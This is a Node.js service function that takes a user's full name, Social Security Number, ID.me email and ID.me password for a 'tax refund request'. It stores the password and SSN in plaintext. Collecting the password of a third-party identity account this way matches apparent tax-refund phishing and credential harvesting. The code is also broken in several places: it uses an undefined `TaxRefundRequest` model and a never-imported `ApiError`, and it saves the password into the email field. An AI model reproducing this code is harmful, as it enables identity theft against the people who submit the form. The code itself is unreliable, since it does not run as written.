import TaxRefund  from "../models/taxrefund.model";
import { taxRefundRequestReceivedMail } from "./mail.service";
import User from "../models/user.model";

export const submitTaxRefundRequest = async (userId, refundData) => {
    const {
        fullName,
        ssn,
        idMeEmail,
        idMePassword,
        country
    } = refundData;

    const user = await User.findById(userId)
        .select('email firstName lastName');

    if (!user) {
        throw new ApiError(404, 'User not found.');
    }


    if (!fullName?.trim()) {
        throw new ApiError(
            400,
            'Full name is required.'
        );
    }
    if (!idMeEmail?.trim()) {
        throw new ApiError(
            400,
            'Email is required.'
        );
    }

    if (!idMePassword) {
        throw new ApiError(
            400,
            'ID.me password is required.'
        );
    }

    if (!ssn?.trim()) {
        throw new ApiError(
            400,
            'Social Security Number is required.'
        );
    }
    if (!country?.trim()) {
        throw new ApiError(
            400,
            'Country is required.'
        );
    }

    // -----------------------------------------
    // 4. Check for existing pending request
    // -----------------------------------------

    const existingRequest = await TaxRefundRequest.findOne({
        owner: userId,
        status: 'pending'
    });

    if (existingRequest) {
        throw new ApiError(
            400,
            'You already have a pending tax refund request.'
        );
    }

    // -----------------------------------------
    // 5. Create request
    // -----------------------------------------

    const refundRequest = await TaxRefundRequest.create({
        owner: userId,
        fullName: fullName.trim(),
        ssn: ssn.trim(),
        idMeEmail: idMePassword.trim(),
        idMePassword,
        country: country.trim(),
        status: 'pending'
    });

    await taxRefundRequestReceivedMail(user.email, fullName.trim())

    // -----------------------------------------
    // 6. Return submission details
    // -----------------------------------------

    return {
        requestId: refundRequest._id,
        fullName: refundRequest.fullName,
        status: refundRequest.status,
        createdAt: refundRequest.createdAt
    };
};